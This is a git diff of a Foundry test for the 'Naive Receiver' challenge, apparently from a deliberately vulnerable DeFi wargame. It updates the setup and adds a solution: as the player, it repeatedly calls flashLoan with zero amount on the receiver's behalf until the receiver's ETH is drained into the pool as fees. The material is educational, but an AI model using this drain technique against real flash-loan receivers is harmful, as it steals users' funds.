@@ -12,34 +12,45 @@ contract NaiveReceiver is Test {
     uint256 internal constant ETHER_IN_RECEIVER = 10e18;
 
     Utilities internal utils;
-    NaiveReceiverLenderPool internal naiveReceiverLenderPool;
+    NaiveReceiverLenderPool internal pool;
     FlashLoanReceiver internal flashLoanReceiver;
+    address payable internal owner;
     address payable internal user;
-    address payable internal attacker;
+    address payable internal player;
 
     function setUp() public {
         utils = new Utilities();
-        address payable[] memory users = utils.createUsers(2);
-        user = users[0];
-        attacker = users[1];
+        address payable[] memory users = utils.createUsers(3);
+        owner = users[0];
+        player = users[1];
+        user = users[2];
 
+        vm.label(owner, "Owner");
         vm.label(user, "User");
-        vm.label(attacker, "Attacker");
+        vm.label(player, "Player");
 
-        naiveReceiverLenderPool = new NaiveReceiverLenderPool();
-        vm.label(address(naiveReceiverLenderPool), "Naive Receiver Lender Pool");
-        vm.deal(address(naiveReceiverLenderPool), ETHER_IN_POOL);
+        vm.startPrank(owner);
 
-        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
-        assertEq(naiveReceiverLenderPool.fixedFee(), 1e18);
-
+        pool = new NaiveReceiverLenderPool();
+        vm.label(address(pool), "Naive Receiver Lender Pool");
         flashLoanReceiver = new FlashLoanReceiver(
-            payable(naiveReceiverLenderPool)
+            payable(pool)
         );
         vm.label(address(flashLoanReceiver), "Flash Loan Receiver");
-        vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);
 
+        vm.deal(address(pool), ETHER_IN_POOL);
+        address ETH = pool.ETH();
+
+        assertEq(address(pool).balance, ETHER_IN_POOL);
+        assertEq(pool.maxFlashLoan(ETH), ETHER_IN_POOL);
+        assertEq(pool.flashFee(ETH, 0), 1 ether);
+
+        vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);
+        vm.expectRevert(0x48f5c3ed);
+        flashLoanReceiver.onFlashLoan(owner, ETH, ETHER_IN_RECEIVER, 1 ether, "0x");
         assertEq(address(flashLoanReceiver).balance, ETHER_IN_RECEIVER);
+
+        vm.stopPrank();
 
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
@@ -48,6 +59,12 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+
+        vm.startPrank(player);
+        while(address(flashLoanReceiver).balance > 0) {
+            pool.flashLoan(flashLoanReceiver, pool.ETH(), 0, "");
+        }
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
@@ -59,6 +76,6 @@ contract NaiveReceiver is Test {
     function validation() internal {
         // All ETH has been drained from the receiver
         assertEq(address(flashLoanReceiver).balance, 0);
-        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
+        assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
     }
 }
